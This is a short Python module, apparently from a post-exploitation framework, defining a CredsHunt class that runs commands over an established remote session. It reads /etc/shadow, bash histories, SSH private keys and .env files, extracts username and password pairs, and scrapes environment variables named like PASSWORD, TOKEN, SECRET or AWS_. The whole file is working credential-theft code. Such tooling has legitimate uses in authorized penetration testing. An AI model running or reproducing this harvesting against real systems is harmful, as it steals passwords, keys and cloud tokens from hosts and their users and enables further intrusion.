from __future__ import annotations
from core.state import Credential, Session


CRED_PATHS = [
    "/etc/shadow",
    "/root/.bash_history",
    "/home/*/.bash_history",
    "/home/*/.ssh/id_rsa",
    "/var/www/*/.env",
    "/opt/*/.env",
]

ENV_KEYS = ["PASSWORD", "PASS", "TOKEN", "SECRET", "API_KEY", "AWS_"]


class CredsHunt:
    def __init__(self, handler, regex_utils):
        self.handler = handler
        self.rx = regex_utils

    async def hunt(self, session: Session, state) -> list:
        found: list[Credential] = []
        for p in CRED_PATHS:
            out = await self.handler.send(
                session, f"cat {p} 2>/dev/null | head -50"
            )
            if not out.strip():
                continue
            for u, pw in self.rx.extract_user_pass(out):
                c = Credential(username=u, password=pw, host=session.host,
                               source=f"file:{p}")
                state.add_credential(c)
                found.append(c)

        env = await self.handler.send(session, "env")
        for k in ENV_KEYS:
            for line in env.splitlines():
                if k in line and "=" in line:
                    key, _, val = line.partition("=")
                    c = Credential(username=key.strip(), password=val.strip(),
                                   host=session.host, source="env")
                    state.add_credential(c)
                    found.append(c)
        return found
